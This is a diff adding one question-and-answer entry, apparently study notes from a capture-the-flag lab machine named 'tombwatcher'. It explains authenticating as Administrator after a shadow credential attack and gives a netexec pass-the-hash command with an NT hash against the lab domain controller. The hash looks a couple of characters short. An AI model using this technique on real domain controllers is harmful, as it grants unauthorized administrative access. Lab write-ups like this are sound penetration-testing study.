@@ -1,0 +1,9 @@
+TECHNIQUE / QUESTION:
+How do you authenticate as the 'Administrator' account after performing the shadow credential attack?
+
+CONTEXT:
+You have acquired the NT hash for the Administrator account.
+
+METHOD / ANSWER:
+Command: `netexec smb dc01.tombwatcher.htb -u administrator -H ad9324754583e42b55aad4d3b8d2bf`
+Explanation: This command utilizes the NTLM hash for the Administrator account to establish an SMB session, granting you elevated access.
